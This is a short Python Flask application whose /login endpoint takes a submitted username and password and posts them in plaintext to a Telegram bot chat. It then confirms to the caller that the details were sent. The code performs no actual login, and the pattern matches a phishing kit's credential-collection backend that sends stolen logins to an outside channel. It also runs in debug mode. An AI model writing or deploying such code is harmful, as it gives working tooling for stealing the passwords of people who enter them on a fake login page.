from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello, World!'

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    send_message_to_telegram(username, password)
    return jsonify({'message': 'Login details sent to Telegram bot successfully!'})

def send_message_to_telegram(username, password):
    bot_token = "YOUR_BOT_TOKEN_HERE"
    chat_id = "YOUR_CHAT_ID_HERE"
    message = f"Login Attempt:\nUsername: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    response = requests.post(url, params=params)
    if response.ok:
        print("Message sent to Telegram bot successfully!")
    else:
        print("Failed to send message to Telegram bot.")

if __name__ == '__main__':
    app.run(debug=True)
